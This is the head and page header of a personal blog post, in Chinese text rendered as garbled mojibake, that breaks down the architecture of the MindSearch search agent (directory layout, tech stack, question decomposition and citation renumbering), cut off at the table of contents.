<!DOCTYPE html>
<html lang="chs" itemscope itemtype="http://schema.org/WebPage"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />

  <link rel="icon" href="../../../favicon.svg">

  <title>
  2025-07-17 æ‹†è§£Agenté¡¹ç›®ï¼šMindSearch - å¾æ…§å¿—çš„ä¸ªäººåšå®¢
  </title>
  <meta name="description" content="æœ€è¿‘å¼€å§‹æ•´ç† Agent é¡¹ç›®ï¼Œæ‰“ç®—äº†è§£ä¸€ä¸‹é¡¹ç›®èƒŒåçš„æ€è·¯ï¼Œæ‹“å®½ä¸€ä¸‹è§†é‡ã€‚
é¡¹ç›®åœ°å€ï¼šhttps://github.com/InternLM/MindSearch
è¿™ä¸ªé¡¹ç›®çš„æ ¸å¿ƒç†å¿µæ˜¯è®©AIå°†å¤æ‚é—®é¢˜åˆ†è§£ä¸ºå¤šä¸ªå­é—®é¢˜ï¼Œå¹¶è¡Œæœç´¢è·å–ä¿¡æ¯ï¼Œæœ€åç»¼åˆæ‰€æœ‰ä¿¡æ¯ç»™å‡ºå®Œæ•´ç­”æ¡ˆã€‚
é¡¹ç›®æ¶æ„
1. æ ¸å¿ƒç»„ä»¶ç»“æ„
MindSearch/
â”œâ”€â”€Â mindsearch/Â Â Â Â Â Â Â Â Â Â Â #Â æ ¸å¿ƒAIÂ agentæ¨¡å—
â”‚Â Â Â â”œâ”€â”€Â agent/Â Â Â Â Â Â Â Â Â Â Â #Â æ™ºèƒ½ä½“å®ç°
â”‚Â Â Â â”œâ”€â”€Â app.pyÂ Â Â Â Â Â Â Â Â Â #Â FastAPIåç«¯æœåŠ¡
â”‚Â Â Â â””â”€â”€Â terminal.pyÂ Â Â Â Â #Â å‘½ä»¤è¡Œæ¥å£
â”œâ”€â”€Â frontend/Â Â Â Â Â Â Â Â Â Â Â #Â å‰ç«¯ç•Œé¢
â”‚Â Â Â â”œâ”€â”€Â React/Â Â Â Â Â Â Â Â Â #Â Reactå‰ç«¯
â”‚Â Â Â â”œâ”€â”€Â gradio_agentchatbot/Â Â #Â Gradioç»„ä»¶
â”‚Â Â Â â””â”€â”€Â streamlitå‰ç«¯
â””â”€â”€Â docker/Â Â Â Â Â Â Â Â Â Â Â Â #Â Dockeréƒ¨ç½²å·¥å…·
2. æŠ€æœ¯æ ˆ

åç«¯ : FastAPI &#43; Python
AIæ¡†æ¶ : Lagent (åŸºäºInternLM)
å‰ç«¯ : React &#43; TypeScript &#43; Vite
UIç»„ä»¶ : Antd &#43; ReactFlow (ç”¨äºå¯è§†åŒ–æœç´¢å›¾)
æœç´¢å¼•æ“ : æ”¯æŒå¤šç§æœç´¢API (Bing, Google, DuckDuckGoç­‰)

æ ¸å¿ƒå·¥ä½œåŸç†
1. MindSearch Agent (mindsearch_agent.py)
ä¸»è¦åŠŸèƒ½

é—®é¢˜åˆ†è§£ : å°†å¤æ‚é—®é¢˜åˆ†è§£ä¸ºå¤šä¸ªå¯æœç´¢çš„å­é—®é¢˜
å¹¶è¡Œæœç´¢ : åŒæ—¶æ‰§è¡Œå¤šä¸ªæœç´¢ä»»åŠ¡
ä¿¡æ¯æ•´åˆ : å°†æœç´¢ç»“æœæ•´ç†æˆâ€œå‚è€ƒèµ„æ–™â€ï¼Œå†è®©å¤§æ¨¡å‹æ ¹æ®è¿™äº›èµ„æ–™ç”Ÿæˆæœ€ç»ˆç­”æ¡ˆã€‚
æµå¼è¾“å‡º : å®æ—¶è¿”å›æœç´¢è¿›åº¦å’Œç»“æœ

æ¨¡å—è§£æ
å‰ç½®ç±»å‹å’Œå·¥å…·

AgentMessage, AgentStatusCode, ModelStatusCode
æ¥è‡ª lagent.schemaï¼Œç”¨æ¥æè¿°â€œå¯¹è¯ä¸­çš„ä¸€æ¡æ¶ˆæ¯â€åŠå…¶â€œçŠ¶æ€ç â€ã€‚
GeneratorWithReturn
æ¥è‡ª lagent.utilsï¼Œæ˜¯ä¸€ä¸ªâ€œæ—¢èƒ½è¿­ä»£åˆèƒ½åœ¨æœ€åæ‹¿è¿”å›å€¼â€çš„ç”Ÿæˆå™¨åŒ…è£…å™¨ã€‚
è¿™é‡Œç”¨æ¥æ‰§è¡Œ self.action.run(&hellip;)ï¼Œæ—¢èƒ½å®æ—¶äº§å‡ºä¸­é—´æ¶ˆæ¯ï¼Œåˆèƒ½åœ¨ç»“æŸæ—¶æ‹¿åˆ°å®Œæ•´çš„å›¾æ•°æ®ã€‚
ExecutionAction, WebSearchGraph
æ¥è‡ªæœ¬åœ°æ¨¡å— .graphã€‚

ä¸¤ä¸ªå°å·¥å…·å‡½æ•°

_update_ref(ref, ref2url, ptr)
æŠŠä¸€æ®µæ–‡å­—é‡Œçš„â€œ[[æ•°å­—]]â€å¼•ç”¨æ ‡è®°é‡æ–°ç¼–å·ï¼Œå¹¶åŒæ­¥æ›´æ–° ref2urlã€‚
ä¸¾ä¾‹ï¼š

ref  = &#34;æ ¹æ® [[3]] å’Œ [[5]] çš„ç»“è®º...&#34;
ptr  = 7
è¾“å‡º = &#34;æ ¹æ® [[8]] å’Œ [[9]] çš„ç»“è®º...&#34; ï¼Œ
å¹¶æŠŠ ref2url ä¸­ 3ã€5 å¯¹åº”çš„ url æ˜ å°„åˆ° 8ã€9ã€‚
è¿”å›å€¼ï¼šæ›´æ–°åçš„æ–‡æœ¬ã€æ›´æ–°åçš„ url æ˜ å°„ã€æœ¬æ¬¡æ–°å¢äº†å¤šå°‘ä¸ªå¼•ç”¨ã€‚" /><meta name="generator" content="Hugo 0.135.0">
  <link rel="stylesheet" href="http://localhost:1313/css/styles.css" />
  
  

  
  <meta property="og:url" content="http://localhost:1313/chs/know_how/2025-07-17-%E6%8B%86%E8%A7%A3agent%E9%A1%B9%E7%9B%AEmindsearch/">
  <meta property="og:site_name" content="å¾æ…§å¿—çš„ä¸ªäººåšå®¢">
  <meta property="og:title" content="2025-07-17 æ‹†è§£Agenté¡¹ç›®ï¼šMindSearch">
  <meta property="og:description" content="æœ€è¿‘å¼€å§‹æ•´ç† Agent é¡¹ç›®ï¼Œæ‰“ç®—äº†è§£ä¸€ä¸‹é¡¹ç›®èƒŒåçš„æ€è·¯ï¼Œæ‹“å®½ä¸€ä¸‹è§†é‡ã€‚
é¡¹ç›®åœ°å€ï¼šhttps://github.com/InternLM/MindSearch
è¿™ä¸ªé¡¹ç›®çš„æ ¸å¿ƒç†å¿µæ˜¯è®©AIå°†å¤æ‚é—®é¢˜åˆ†è§£ä¸ºå¤šä¸ªå­é—®é¢˜ï¼Œå¹¶è¡Œæœç´¢è·å–ä¿¡æ¯ï¼Œæœ€åç»¼åˆæ‰€æœ‰ä¿¡æ¯ç»™å‡ºå®Œæ•´ç­”æ¡ˆã€‚
é¡¹ç›®æ¶æ„ 1. æ ¸å¿ƒç»„ä»¶ç»“æ„ MindSearch/ â”œâ”€â”€Â mindsearch/Â #Â æ ¸å¿ƒAIÂ agentæ¨¡å— â”‚Â â”œâ”€â”€Â agent/Â #Â æ™ºèƒ½ä½“å®ç° â”‚Â â”œâ”€â”€Â app.pyÂ #Â FastAPIåç«¯æœåŠ¡ â”‚Â â””â”€â”€Â terminal.pyÂ #Â å‘½ä»¤è¡Œæ¥å£ â”œâ”€â”€Â frontend/Â #Â å‰ç«¯ç•Œé¢ â”‚Â â”œâ”€â”€Â React/Â #Â Reactå‰ç«¯ â”‚Â â”œâ”€â”€Â gradio_agentchatbot/Â #Â Gradioç»„ä»¶ â”‚Â â””â”€â”€Â streamlitå‰ç«¯ â””â”€â”€Â docker/Â #Â Dockeréƒ¨ç½²å·¥å…· 2. æŠ€æœ¯æ ˆ åç«¯ : FastAPI &#43; Python AIæ¡†æ¶ : Lagent (åŸºäºInternLM) å‰ç«¯ : React &#43; TypeScript &#43; Vite UIç»„ä»¶ : Antd &#43; ReactFlow (ç”¨äºå¯è§†åŒ–æœç´¢å›¾) æœç´¢å¼•æ“ : æ”¯æŒå¤šç§æœç´¢API (Bing, Google, DuckDuckGoç­‰) æ ¸å¿ƒå·¥ä½œåŸç† 1. MindSearch Agent (mindsearch_agent.py) ä¸»è¦åŠŸèƒ½ é—®é¢˜åˆ†è§£ : å°†å¤æ‚é—®é¢˜åˆ†è§£ä¸ºå¤šä¸ªå¯æœç´¢çš„å­é—®é¢˜ å¹¶è¡Œæœç´¢ : åŒæ—¶æ‰§è¡Œå¤šä¸ªæœç´¢ä»»åŠ¡ ä¿¡æ¯æ•´åˆ : å°†æœç´¢ç»“æœæ•´ç†æˆâ€œå‚è€ƒèµ„æ–™â€ï¼Œå†è®©å¤§æ¨¡å‹æ ¹æ®è¿™äº›èµ„æ–™ç”Ÿæˆæœ€ç»ˆç­”æ¡ˆã€‚ æµå¼è¾“å‡º : å®æ—¶è¿”å›æœç´¢è¿›åº¦å’Œç»“æœ æ¨¡å—è§£æ å‰ç½®ç±»å‹å’Œå·¥å…· AgentMessage, AgentStatusCode, ModelStatusCode æ¥è‡ª lagent.schemaï¼Œç”¨æ¥æè¿°â€œå¯¹è¯ä¸­çš„ä¸€æ¡æ¶ˆæ¯â€åŠå…¶â€œçŠ¶æ€ç â€ã€‚ GeneratorWithReturn æ¥è‡ª lagent.utilsï¼Œæ˜¯ä¸€ä¸ªâ€œæ—¢èƒ½è¿­ä»£åˆèƒ½åœ¨æœ€åæ‹¿è¿”å›å€¼â€çš„ç”Ÿæˆå™¨åŒ…è£…å™¨ã€‚ è¿™é‡Œç”¨æ¥æ‰§è¡Œ self.action.run(â€¦)ï¼Œæ—¢èƒ½å®æ—¶äº§å‡ºä¸­é—´æ¶ˆæ¯ï¼Œåˆèƒ½åœ¨ç»“æŸæ—¶æ‹¿åˆ°å®Œæ•´çš„å›¾æ•°æ®ã€‚ ExecutionAction, WebSearchGraph æ¥è‡ªæœ¬åœ°æ¨¡å— .graphã€‚ ä¸¤ä¸ªå°å·¥å…·å‡½æ•° _update_ref(ref, ref2url, ptr) æŠŠä¸€æ®µæ–‡å­—é‡Œçš„â€œ[[æ•°å­—]]â€å¼•ç”¨æ ‡è®°é‡æ–°ç¼–å·ï¼Œå¹¶åŒæ­¥æ›´æ–° ref2urlã€‚ ä¸¾ä¾‹ï¼š ref = &#34;æ ¹æ® [[3]] å’Œ [[5]] çš„ç»“è®º...&#34; ptr = 7 è¾“å‡º = &#34;æ ¹æ® [[8]] å’Œ [[9]] çš„ç»“è®º...&#34; ï¼Œ å¹¶æŠŠ ref2url ä¸­ 3ã€5 å¯¹åº”çš„ url æ˜ å°„åˆ° 8ã€9ã€‚ è¿”å›å€¼ï¼šæ›´æ–°åçš„æ–‡æœ¬ã€æ›´æ–°åçš„ url æ˜ å°„ã€æœ¬æ¬¡æ–°å¢äº†å¤šå°‘ä¸ªå¼•ç”¨ã€‚">
  <meta property="og:locale" content="chs">
  <meta property="og:type" content="article">
    <meta property="article:section" content="know_how">
    <meta property="article:published_time" content="2025-12-05T13:54:40+00:00">
    <meta property="article:modified_time" content="2025-12-05T13:54:40+00:00">
    <meta property="article:tag" content="Tech">

  
  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="2025-07-17 æ‹†è§£Agenté¡¹ç›®ï¼šMindSearch">
  <meta name="twitter:description" content="æœ€è¿‘å¼€å§‹æ•´ç† Agent é¡¹ç›®ï¼Œæ‰“ç®—äº†è§£ä¸€ä¸‹é¡¹ç›®èƒŒåçš„æ€è·¯ï¼Œæ‹“å®½ä¸€ä¸‹è§†é‡ã€‚
é¡¹ç›®åœ°å€ï¼šhttps://github.com/InternLM/MindSearch
è¿™ä¸ªé¡¹ç›®çš„æ ¸å¿ƒç†å¿µæ˜¯è®©AIå°†å¤æ‚é—®é¢˜åˆ†è§£ä¸ºå¤šä¸ªå­é—®é¢˜ï¼Œå¹¶è¡Œæœç´¢è·å–ä¿¡æ¯ï¼Œæœ€åç»¼åˆæ‰€æœ‰ä¿¡æ¯ç»™å‡ºå®Œæ•´ç­”æ¡ˆã€‚
é¡¹ç›®æ¶æ„ 1. æ ¸å¿ƒç»„ä»¶ç»“æ„ MindSearch/ â”œâ”€â”€Â mindsearch/Â #Â æ ¸å¿ƒAIÂ agentæ¨¡å— â”‚Â â”œâ”€â”€Â agent/Â #Â æ™ºèƒ½ä½“å®ç° â”‚Â â”œâ”€â”€Â app.pyÂ #Â FastAPIåç«¯æœåŠ¡ â”‚Â â””â”€â”€Â terminal.pyÂ #Â å‘½ä»¤è¡Œæ¥å£ â”œâ”€â”€Â frontend/Â #Â å‰ç«¯ç•Œé¢ â”‚Â â”œâ”€â”€Â React/Â #Â Reactå‰ç«¯ â”‚Â â”œâ”€â”€Â gradio_agentchatbot/Â #Â Gradioç»„ä»¶ â”‚Â â””â”€â”€Â streamlitå‰ç«¯ â””â”€â”€Â docker/Â #Â Dockeréƒ¨ç½²å·¥å…· 2. æŠ€æœ¯æ ˆ åç«¯ : FastAPI &#43; Python AIæ¡†æ¶ : Lagent (åŸºäºInternLM) å‰ç«¯ : React &#43; TypeScript &#43; Vite UIç»„ä»¶ : Antd &#43; ReactFlow (ç”¨äºå¯è§†åŒ–æœç´¢å›¾) æœç´¢å¼•æ“ : æ”¯æŒå¤šç§æœç´¢API (Bing, Google, DuckDuckGoç­‰) æ ¸å¿ƒå·¥ä½œåŸç† 1. MindSearch Agent (mindsearch_agent.py) ä¸»è¦åŠŸèƒ½ é—®é¢˜åˆ†è§£ : å°†å¤æ‚é—®é¢˜åˆ†è§£ä¸ºå¤šä¸ªå¯æœç´¢çš„å­é—®é¢˜ å¹¶è¡Œæœç´¢ : åŒæ—¶æ‰§è¡Œå¤šä¸ªæœç´¢ä»»åŠ¡ ä¿¡æ¯æ•´åˆ : å°†æœç´¢ç»“æœæ•´ç†æˆâ€œå‚è€ƒèµ„æ–™â€ï¼Œå†è®©å¤§æ¨¡å‹æ ¹æ®è¿™äº›èµ„æ–™ç”Ÿæˆæœ€ç»ˆç­”æ¡ˆã€‚ æµå¼è¾“å‡º : å®æ—¶è¿”å›æœç´¢è¿›åº¦å’Œç»“æœ æ¨¡å—è§£æ å‰ç½®ç±»å‹å’Œå·¥å…· AgentMessage, AgentStatusCode, ModelStatusCode æ¥è‡ª lagent.schemaï¼Œç”¨æ¥æè¿°â€œå¯¹è¯ä¸­çš„ä¸€æ¡æ¶ˆæ¯â€åŠå…¶â€œçŠ¶æ€ç â€ã€‚ GeneratorWithReturn æ¥è‡ª lagent.utilsï¼Œæ˜¯ä¸€ä¸ªâ€œæ—¢èƒ½è¿­ä»£åˆèƒ½åœ¨æœ€åæ‹¿è¿”å›å€¼â€çš„ç”Ÿæˆå™¨åŒ…è£…å™¨ã€‚ è¿™é‡Œç”¨æ¥æ‰§è¡Œ self.action.run(â€¦)ï¼Œæ—¢èƒ½å®æ—¶äº§å‡ºä¸­é—´æ¶ˆæ¯ï¼Œåˆèƒ½åœ¨ç»“æŸæ—¶æ‹¿åˆ°å®Œæ•´çš„å›¾æ•°æ®ã€‚ ExecutionAction, WebSearchGraph æ¥è‡ªæœ¬åœ°æ¨¡å— .graphã€‚ ä¸¤ä¸ªå°å·¥å…·å‡½æ•° _update_ref(ref, ref2url, ptr) æŠŠä¸€æ®µæ–‡å­—é‡Œçš„â€œ[[æ•°å­—]]â€å¼•ç”¨æ ‡è®°é‡æ–°ç¼–å·ï¼Œå¹¶åŒæ­¥æ›´æ–° ref2urlã€‚ ä¸¾ä¾‹ï¼š ref = &#34;æ ¹æ® [[3]] å’Œ [[5]] çš„ç»“è®º...&#34; ptr = 7 è¾“å‡º = &#34;æ ¹æ® [[8]] å’Œ [[9]] çš„ç»“è®º...&#34; ï¼Œ å¹¶æŠŠ ref2url ä¸­ 3ã€5 å¯¹åº”çš„ url æ˜ å°„åˆ° 8ã€9ã€‚ è¿”å›å€¼ï¼šæ›´æ–°åçš„æ–‡æœ¬ã€æ›´æ–°åçš„ url æ˜ å°„ã€æœ¬æ¬¡æ–°å¢äº†å¤šå°‘ä¸ªå¼•ç”¨ã€‚">

  
  <meta itemprop="name" content="2025-07-17 æ‹†è§£Agenté¡¹ç›®ï¼šMindSearch">
  <meta itemprop="description" content="æœ€è¿‘å¼€å§‹æ•´ç† Agent é¡¹ç›®ï¼Œæ‰“ç®—äº†è§£ä¸€ä¸‹é¡¹ç›®èƒŒåçš„æ€è·¯ï¼Œæ‹“å®½ä¸€ä¸‹è§†é‡ã€‚
é¡¹ç›®åœ°å€ï¼šhttps://github.com/InternLM/MindSearch
è¿™ä¸ªé¡¹ç›®çš„æ ¸å¿ƒç†å¿µæ˜¯è®©AIå°†å¤æ‚é—®é¢˜åˆ†è§£ä¸ºå¤šä¸ªå­é—®é¢˜ï¼Œå¹¶è¡Œæœç´¢è·å–ä¿¡æ¯ï¼Œæœ€åç»¼åˆæ‰€æœ‰ä¿¡æ¯ç»™å‡ºå®Œæ•´ç­”æ¡ˆã€‚
é¡¹ç›®æ¶æ„ 1. æ ¸å¿ƒç»„ä»¶ç»“æ„ MindSearch/ â”œâ”€â”€Â mindsearch/Â #Â æ ¸å¿ƒAIÂ agentæ¨¡å— â”‚Â â”œâ”€â”€Â agent/Â #Â æ™ºèƒ½ä½“å®ç° â”‚Â â”œâ”€â”€Â app.pyÂ #Â FastAPIåç«¯æœåŠ¡ â”‚Â â””â”€â”€Â terminal.pyÂ #Â å‘½ä»¤è¡Œæ¥å£ â”œâ”€â”€Â frontend/Â #Â å‰ç«¯ç•Œé¢ â”‚Â â”œâ”€â”€Â React/Â #Â Reactå‰ç«¯ â”‚Â â”œâ”€â”€Â gradio_agentchatbot/Â #Â Gradioç»„ä»¶ â”‚Â â””â”€â”€Â streamlitå‰ç«¯ â””â”€â”€Â docker/Â #Â Dockeréƒ¨ç½²å·¥å…· 2. æŠ€æœ¯æ ˆ åç«¯ : FastAPI &#43; Python AIæ¡†æ¶ : Lagent (åŸºäºInternLM) å‰ç«¯ : React &#43; TypeScript &#43; Vite UIç»„ä»¶ : Antd &#43; ReactFlow (ç”¨äºå¯è§†åŒ–æœç´¢å›¾) æœç´¢å¼•æ“ : æ”¯æŒå¤šç§æœç´¢API (Bing, Google, DuckDuckGoç­‰) æ ¸å¿ƒå·¥ä½œåŸç† 1. MindSearch Agent (mindsearch_agent.py) ä¸»è¦åŠŸèƒ½ é—®é¢˜åˆ†è§£ : å°†å¤æ‚é—®é¢˜åˆ†è§£ä¸ºå¤šä¸ªå¯æœç´¢çš„å­é—®é¢˜ å¹¶è¡Œæœç´¢ : åŒæ—¶æ‰§è¡Œå¤šä¸ªæœç´¢ä»»åŠ¡ ä¿¡æ¯æ•´åˆ : å°†æœç´¢ç»“æœæ•´ç†æˆâ€œå‚è€ƒèµ„æ–™â€ï¼Œå†è®©å¤§æ¨¡å‹æ ¹æ®è¿™äº›èµ„æ–™ç”Ÿæˆæœ€ç»ˆç­”æ¡ˆã€‚ æµå¼è¾“å‡º : å®æ—¶è¿”å›æœç´¢è¿›åº¦å’Œç»“æœ æ¨¡å—è§£æ å‰ç½®ç±»å‹å’Œå·¥å…· AgentMessage, AgentStatusCode, ModelStatusCode æ¥è‡ª lagent.schemaï¼Œç”¨æ¥æè¿°â€œå¯¹è¯ä¸­çš„ä¸€æ¡æ¶ˆæ¯â€åŠå…¶â€œçŠ¶æ€ç â€ã€‚ GeneratorWithReturn æ¥è‡ª lagent.utilsï¼Œæ˜¯ä¸€ä¸ªâ€œæ—¢èƒ½è¿­ä»£åˆèƒ½åœ¨æœ€åæ‹¿è¿”å›å€¼â€çš„ç”Ÿæˆå™¨åŒ…è£…å™¨ã€‚ è¿™é‡Œç”¨æ¥æ‰§è¡Œ self.action.run(â€¦)ï¼Œæ—¢èƒ½å®æ—¶äº§å‡ºä¸­é—´æ¶ˆæ¯ï¼Œåˆèƒ½åœ¨ç»“æŸæ—¶æ‹¿åˆ°å®Œæ•´çš„å›¾æ•°æ®ã€‚ ExecutionAction, WebSearchGraph æ¥è‡ªæœ¬åœ°æ¨¡å— .graphã€‚ ä¸¤ä¸ªå°å·¥å…·å‡½æ•° _update_ref(ref, ref2url, ptr) æŠŠä¸€æ®µæ–‡å­—é‡Œçš„â€œ[[æ•°å­—]]â€å¼•ç”¨æ ‡è®°é‡æ–°ç¼–å·ï¼Œå¹¶åŒæ­¥æ›´æ–° ref2urlã€‚ ä¸¾ä¾‹ï¼š ref = &#34;æ ¹æ® [[3]] å’Œ [[5]] çš„ç»“è®º...&#34; ptr = 7 è¾“å‡º = &#34;æ ¹æ® [[8]] å’Œ [[9]] çš„ç»“è®º...&#34; ï¼Œ å¹¶æŠŠ ref2url ä¸­ 3ã€5 å¯¹åº”çš„ url æ˜ å°„åˆ° 8ã€9ã€‚ è¿”å›å€¼ï¼šæ›´æ–°åçš„æ–‡æœ¬ã€æ›´æ–°åçš„ url æ˜ å°„ã€æœ¬æ¬¡æ–°å¢äº†å¤šå°‘ä¸ªå¼•ç”¨ã€‚">
  <meta itemprop="datePublished" content="2025-12-05T13:54:40+00:00">
  <meta itemprop="dateModified" content="2025-12-05T13:54:40+00:00">
  <meta itemprop="wordCount" content="704">
  <meta itemprop="keywords" content="Tech">

  
  <meta name="lang" content="chs" />
  

  
</head>
<body class="dark:bg-gray-800 dark:text-white relative flex flex-col min-h-screen"><header class="container flex justify-between md:justify-between gap-4 flex-wrap p-6 mx-auto relative">
  <a href="http://localhost:1313/chs/" class="capitalize font-extrabold text-2xl">
    
    <img src="../../../blist-logo.png" alt="å¾æ…§å¿—çš„ä¸ªäººåšå®¢" class="h-8 max-w-full" />
    
  </a>
  <button class="mobile-menu-button md:hidden">
    <svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
      <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
      <line x1="4" y1="8" x2="20" y2="8" />
      <line x1="4" y1="16" x2="20" y2="16" />
    </svg>
  </button>
  <ul class="mobile-menu absolute z-10 px-6 pb-6 md:p-0 top-full left-0 w-full md:w-auto md:relative hidden md:flex flex-col md:flex-row items-end md:items-center gap-4 lg:gap-6 bg-white dark:bg-gray-800">

    
    <li><a href="../../../chs/know_how/">æŠ€æœ¯</a></li>
    
    <li><a href="../../../chs/life/">ç”Ÿæ´»è§é—»</a></li>
    
    <li><a href="../../../chs/page/about/">å…³äº</a></li>
    
    <li><a href="../../../chs/link/">å®è—é›†ç»“</a></li>
    
    <li><a href="../../../chs/tags/">åˆ†ç±»</a></li>
    

    
    
    <li class="relative cursor-pointer">
      <span class="language-switcher flex items-center gap-2">
        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24"
          stroke-width="1.5" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
          <path stroke="none" d="M0 0h24v24H0z" fill="none" />
          <circle cx="12" cy="12" r="9" />
          <line x1="3.6" y1="9" x2="20.4" y2="9" />
          <line x1="3.6" y1="15" x2="20.4" y2="15" />
          <path d="M11.5 3a17 17 0 0 0 0 18" />
          <path d="M12.5 3a17 17 0 0 1 0 18" />
        </svg>
        <a>è¯­è¨€</a>
        <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14"
          viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" fill="none" stroke-linecap="round"
          stroke-linejoin="round">
          <path stroke="none" d="M0 0h24v24H0z" fill="none" />
          <path d="M18 15l-6 -6l-6 6h12" transform="rotate(180 12 12)" />
        </svg>
      </span>
      <div
        class="language-dropdown absolute top-full mt-2 left-0 flex-col gap-2 bg-gray-100 dark:bg-gray-900 dark:text-white z-10 hidden">
        
        
        
        
        <a class="px-3 py-2 hover:bg-gray-200 dark:hover:bg-gray-700" href="../../../en/" lang="en">English</a>
        
        
        
        <a class="px-3 py-2 hover:bg-gray-200 dark:hover:bg-gray-700" href="../../../de/" lang="de">Deutsch</a>
        
        
      </div>
    </li>
    
    

    
    <li class="grid place-items-center">
      <span class="open-search inline-block cursor-pointer">
        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" stroke-width="1.5"
          stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
          <path stroke="none" d="M0 0h24v24H0z" fill="none" />
          <circle cx="10" cy="10" r="7" />
          <line x1="21" y1="21" x2="15" y2="15" />
        </svg>
      </span>
    </li>
    

    
    <li class="grid place-items-center">
      <span class="toggle-dark-mode inline-block cursor-pointer">
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" stroke-width="1.5"
          stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
          <path stroke="none" d="M0 0h24v24H0z" fill="none" />
          <circle cx="12" cy="12" r="3" />
          <line x1="12" y1="5" x2="12" y2="5.01" />
          <line x1="17" y1="7" x2="17" y2="7.01" />
          <line x1="19" y1="12" x2="19" y2="12.01" />
          <line x1="17" y1="17" x2="17" y2="17.01" />
          <line x1="12" y1="19" x2="12" y2="19.01" />
          <line x1="7" y1="17" x2="7" y2="17.01" />
          <line x1="5" y1="12" x2="5" y2="12.01" />
          <line x1="7" y1="7" x2="7" y2="7.01" />
        </svg>
      </span>
    </li>
    
  </ul>
</header>
<main class="flex-1">
  
  

  

  <article class="prose lg:prose-lg mx-auto my-8 dark:prose-dark px-4">

    <h1 class="text-2xl font-bold mb-2">2025-07-17 æ‹†è§£Agenté¡¹ç›®ï¼šMindSearch</h1>
    
    <h5 class="text-sm flex items-center flex-wrap">
      <svg xmlns="http://www.w3.org/2000/svg" class="mr-1" width="16" height="16" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
        <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
        <rect x="4" y="5" width="16" height="16" rx="2" />
        <line x1="16" y1="3" x2="16" y2="7" />
        <line x1="8" y1="3" x2="8" y2="7" />
        <line x1="4" y1="11" x2="20" y2="11" />
        <rect x="8" y="15" width="2" height="2" />
      </svg>
      å‘å¸ƒäº 
  
    2025å¹´12æœˆ05æ—¥
  

      
        &nbsp;&bull;&nbsp;
      
      <svg xmlns="http://www.w3.org/2000/svg" class="mr-1" width="16" height="16" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
        <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
        <circle cx="12" cy="12" r="9" />
        <polyline points="12 7 12 12 15 15" />
      </svg>
     4&nbsp;åˆ†é’Ÿ
     
      &nbsp;&bull;
      <svg xmlns="http://www.w3.org/2000/svg" class="mx-1" width="16" height="16" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
        <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
        <path d="M3 19a9 9 0 0 1 9 0a9 9 0 0 1 9 0" />
        <path d="M3 6a9 9 0 0 1 9 0a9 9 0 0 1 9 0" />
        <line x1="3" y1="6" x2="3" y2="19" />
        <line x1="12" y1="6" x2="12" y2="19" />
        <line x1="21" y1="6" x2="21" y2="19" />
      </svg>
      704&nbsp;å­—

    </h5>
    

    <details id="TableOfContents" class="px-4 mt-4 bg-gray-100 dark:bg-gray-700 rounded toc">
    <summary class="flex items-center font-bold py-2 px-4 cursor-pointer justify-between select-none text-black dark:text-white">
      <span>Table of contents</span>
      <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-down" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
        <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
        <polyline points="6 9 12 15 18 9"></polyline>
     </svg>
    </summary>

    <ul class="mt-2 pb-4">
        

        
        <li>
        <a href="#%e9%a1%b9%e7%9b%ae%e6%9e%b6%e6%9e%84">é¡¹ç›®æ¶æ„</a>
        

        
        <ul>
            <li>
        <a href="#1-%e6%a0%b8%e5%bf%83%e7%bb%84%e4%bb%b6%e7%bb%93%e6%9e%84">1. æ ¸å¿ƒç»„ä»¶ç»“æ„</a>
        

        
        </li><li>
        <a href="#2-%e6%8a%80%e6%9c%af%e6%a0%88">2. æŠ€æœ¯æ ˆ</a>
        

        
        </li></ul>
      </li><li>
        <a href="#%e6%a0%b8%e5%bf%83%e5%b7%a5%e4%bd%9c%e5%8e%9f%e7%90%86">æ ¸å¿ƒå·¥ä½œåŸç†</a>
        

        
        <ul>
            <li>
        <a href="#1-mindsearch-agent-mindsearch_agentpy">1. MindSearch Agent (mindsearch_agent.py)</a>
        

        
        <ul>
            <li>
        <a href="#%e4%b8%bb%e8%a6%81%e5%8a%9f%e8%83%bd">ä¸»è¦åŠŸèƒ½</a>
        

        
        </li><li>
        <a href="#%e6%a8%a1%e5%9d%97%e8%a7%a3%e6%9e%90">æ¨¡å—è§£æ</a>
        

        
        </li><li>
        <a href="#%e5%89%8d%e7%bd%ae%e7%b1%bb%e5%9e%8b%e5%92%8c%e5%b7%a5%e5%85%b7">å‰ç½®ç±»å‹å’Œå·¥å…·</a>
        

        
        </li><li>
        <a href="#%e4%b8%a4%e4%b8%aa%e5%b0%8f%e5%b7%a5%e5%85%b7%e5%87%bd%e6%95%b0">ä¸¤ä¸ªå°å·¥å…·å‡½æ•°</a>
        

        
        </li><li>
        <a href="#%e4%b8%bb%e7%b1%bbmindsearchagent">ä¸»ç±»ï¼šMindSearchAgent</a>
        

        
        </li></ul>
      </li><li>
        <a href="#2-mindsearch-enginegraphpy">2. MindSearch Engine(graph.py)</a>
        

        
        <ul>
            <li>
